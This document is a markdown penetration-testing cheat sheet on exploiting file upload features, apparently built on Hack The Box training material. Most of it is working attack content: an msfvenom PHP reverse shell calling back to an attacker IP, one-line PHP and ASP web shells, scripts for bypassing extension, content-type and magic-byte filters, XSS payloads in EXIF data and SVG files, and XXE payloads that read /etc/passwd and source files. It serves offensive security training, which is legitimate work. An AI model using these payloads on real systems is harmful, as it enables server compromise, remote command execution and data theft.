## File Upload

### Basic poc
1. Check for features which allow user to upload content (profile pictures, any documents etc...) 
2. Identify the directory which contains all uploaded files

### Crafting payloads
https://github.com/Arrexel/phpbash
https://github.com/pentestmonkey/php-reverse-shell

```bash
$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

```php
<?php system($_REQUEST['cmd']); ?>
```

```rb
<% eval request('cmd') %>
```

### Client side validation
-> Play with the file type (Folder Menu)
-> "Inspect Element" and delete the borring part 

```html
accept=".jpg,.jpeg,.png"
```

If its a js script called inside HTML file like :  
```html
<script src="./script.js"></script>
```
Delete also

### Blacklist Filter

Example of blacklist filter :

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```
Fuzzing ignored extensions from the filter (using intruder or ffuf): 
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt


### Whitelist Filter
Example of whitelist filter : 
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**Double Extensions** & **Reverse Double Extensions**
We can use this wordlists to fuzz extentions :
- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

Try something like : ``.php.png`` and ``.png.php`` etc...

Character Injection (PHP in version 5.X or earlier)

- %20
- %0a
- %00
- %0d0a
- /
- .\
- ...
- :

ex : shell.php%00.jpg / shell.aspx:.jpg

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

### Content-Type Filter
Ex : 
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

We can fuzz the content type using : 
```bash
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
# All content type started with image/
$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

### Mime-Type Filter
Ex : 
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Signature & Magic Bytes :
- https://en.wikipedia.org/wiki/List_of_file_signatures
- https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime

```bash
$ echo "this is a text file" > text.jpg 
$ file text.jpg 
text.jpg: ASCII text
# adding GIF8 at the beginning 
$ file text.jpg
text.jpg: GIF image data
```

### File Upload to XSS

Put payload inside Comment or Artist parameters
```bash
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
$ exiftool HTB.jpg
...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```

Using SVG file : 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### File Upload to XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Or
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

### Preventing File Upload Vulnerabilities
https://academy.hackthebox.com/module/136/section/1309